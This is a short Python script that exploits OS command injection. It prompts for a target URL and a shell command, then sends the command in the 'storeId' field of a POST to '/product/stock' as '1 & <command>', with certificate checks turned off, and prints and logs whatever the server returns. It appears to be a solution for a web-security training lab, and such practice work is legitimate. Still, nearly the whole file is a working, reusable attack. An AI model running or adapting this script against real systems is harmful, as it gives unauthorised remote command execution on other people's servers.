import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def log_to_file(message, log_file):
    """Simple logging function to write messages to a file."""
    try:
        with open(log_file, 'a') as f:
            f.write(f"{message}\n")
    except IOError as e:
        print(f"[-] Warning: Could not write to log file: {e}")

def exploit_cmd_injection(log_file):
    """Function to exploit command injection by sending a payload with user-provided URL and command."""
    # Prompt user for URL
    url = input("(+) Enter the target URL (e.g., https://www.example.com): ").strip()
    if not url:
        log_to_file("[-] No URL provided. Exiting function.", log_file)
        print("[-] No URL provided.")
        return

    # Prompt user for command
    command = input("(+) Enter the command to inject (e.g., whoami): ").strip()
    if not command:
        log_to_file("[-] No command provided. Exiting function.", log_file)
        print("[-] No command provided.")
        return

    stock_path = '/product/stock'
    injection_payload = '1 & ' + command
    params = {'productId': '1', 'storeId': injection_payload}

    try:
        log_to_file(f"[*] Sending POST request to {url + stock_path} with injected payload...", log_file)
        response = requests.post(url + stock_path, data=params, verify=False, timeout=5)
        
        if response.status_code == 200:
            log_to_file("(+) Command injection successful!", log_file)
            log_to_file(f"(+) Output of command:\n{response.text.strip()}", log_file)
            print("(+) Command injection successful!")
            print(f"(+) Output: {response.text.strip()}")
        else:
            log_to_file(f"(-) Received unexpected status code: {response.status_code}", log_file)
            print(f"(-) Failed with status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        log_to_file(f"[-] Error occurred: {e}", log_file)
        print(f"[-] Error: {e}")

# Example usage for standalone testing
if __name__ == "__main__":
    log_file = "exploit_log.txt"
    exploit_cmd_injection(log_file)